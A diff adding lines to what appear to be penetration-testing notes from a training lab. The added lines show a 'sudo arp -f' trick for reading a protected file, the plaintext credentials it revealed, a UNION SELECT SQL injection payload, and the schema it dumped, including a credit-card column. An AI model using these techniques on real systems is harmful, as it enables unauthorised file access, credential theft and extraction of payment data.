@@ -167,6 +167,71 @@ tcp        0      1 lin.intranet.dono:43222 badguy:shell            SYN_SENT
 tcp   SYN-SENT  0       1                           192.168.150.253:43222           192.168.56.1:shell 
 tcp   SYN-SENT  0       1                           192.168.150.253:43238           192.168.56.1:shell                                                                            @@badguy:514
 127.0.0.1:6010          0.0.0.0:*               LISTEN      59099/sshd: comrade
+--------------------------------------------------------------------------------------------------------------------------------
+
+comrade@lin2:/home$ find / -group itsec 2>/dev/null
+comrade@lin2:/home$ sudo arp -v -f /usr/share/trouble_tickets/readmebillybob.txt 
+
+  USER
+sarah
+  PASSWORD
+3eYk66pglpYXCblIGtwc
+
+RPURFu8GO2YOfJ4YYnAJ
+
+10-million-password-list-top-10000.txt
+-----------------------------------------------------------------------------------------------------------------------------------
+RAM' UNION SELECT table_name,column_name FROM information_schema.columns #
+
+orderlines	sqlinjection
+orders	sqlinjection
+payments	sqlinjection
+products	sqlinjection
+share4	sqlinjection
+
+orderlines	id
+orderlines	quantity
+orderlines	product
+orderlines	order
+orders	id
+orders	date
+orders	member
+payments	id
+payments	creditcard_number
+payments	date
+payments	order
+products	id
+products	name
+products	description
+products	price
+products	qty_left
+products	category
+share4	id
+share4	comment
+share4	mime
+share4	data
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
